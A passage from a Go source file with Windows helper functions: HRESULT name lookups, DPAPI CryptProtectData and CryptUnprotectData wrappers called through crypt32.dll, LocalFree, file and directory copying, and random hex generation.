func hresultName(hr int32) string {
	switch hr {
	case -2147221164:
		return "REGDB_E_CLASSNOTREG — broker not installed"
	case -2147024891:
		return "E_ACCESSDENIED"
	case -2147467262:
		return "E_NOINTERFACE"
	case -2147221008:
		return "CO_E_NOT_INITIALIZED"
	default:
		return fmt.Sprintf("hr %d", hr)
	}
}

// ============================================================================
// DPAPI (crypt32) — real CryptProtectData / CryptUnprotectData.
// ============================================================================

type dataBlob struct {
	cbData uint32
	pbData *byte
}

var (
	crypt32            = syscall.NewLazyDLL("crypt32.dll")
	procCryptProtect   = crypt32.NewProc("CryptProtectData")
	procCryptUnprotect = crypt32.NewProc("CryptUnprotectData")
)

func blobFromBytes(b []byte) dataBlob {
	if len(b) == 0 {
		return dataBlob{}
	}
	return dataBlob{cbData: uint32(len(b)), pbData: &b[0]}
}

func cryptProtect(in []byte) ([]byte, error) {
	inBlob := blobFromBytes(in)
	var outBlob dataBlob
	hr, _, err := procCryptProtect.Call(
		uintptr(unsafe.Pointer(&inBlob)), 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)))
	if hr == 0 {
		return nil, fmt.Errorf("CryptProtectData OS error %d", errnoOf(err))
	}
	defer localFree(uintptr(unsafe.Pointer(outBlob.pbData)))
	out := make([]byte, outBlob.cbData)
	copy(out, unsafe.Slice(outBlob.pbData, outBlob.cbData))
	return out, nil
}

func cryptUnprotect(in []byte) ([]byte, error) {
	inBlob := blobFromBytes(in)
	var outBlob dataBlob
	hr, _, err := procCryptUnprotect.Call(
		uintptr(unsafe.Pointer(&inBlob)), 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)))
	if hr == 0 {
		return nil, fmt.Errorf("CryptUnprotectData OS error %d", errnoOf(err))
	}
	defer localFree(uintptr(unsafe.Pointer(outBlob.pbData)))
	out := make([]byte, outBlob.cbData)
	copy(out, unsafe.Slice(outBlob.pbData, outBlob.cbData))
	return out, nil
}

var procLocalFree = syscall.NewLazyDLL("kernel32.dll").NewProc("LocalFree")

func localFree(p uintptr) {
	if p != 0 {
		procLocalFree.Call(p)
	}
}

// ============================================================================
// Small helpers.
// ============================================================================

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
		return err
	}
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	n, err := io.Copy(out, in)
	if n == 0 {
		return fmt.Errorf("copied 0 bytes from %s", src)
	}
	return err
}

func copyDir(src, dst string) {
	_ = filepath.Walk(src, func(p string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		rel, _ := filepath.Rel(src, p)
		_ = copyFile(p, filepath.Join(dst, rel))
		return nil
	})
}

func randomHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%x", b)
}

// errnoOf extracts the numeric errno from a LazyProc.Call error (0 if none).
func errnoOf(err error) uintptr {
	var errno syscall.Errno
	if errorsAs(err, &errno) {
		return uintptr(errno)
	}
	return 0
}

func errorsAs(err error, target *syscall.Errno) bool {
	if e, ok := err.(syscall.Errno); ok {
		*target = e
		return true
	}
	return false
}
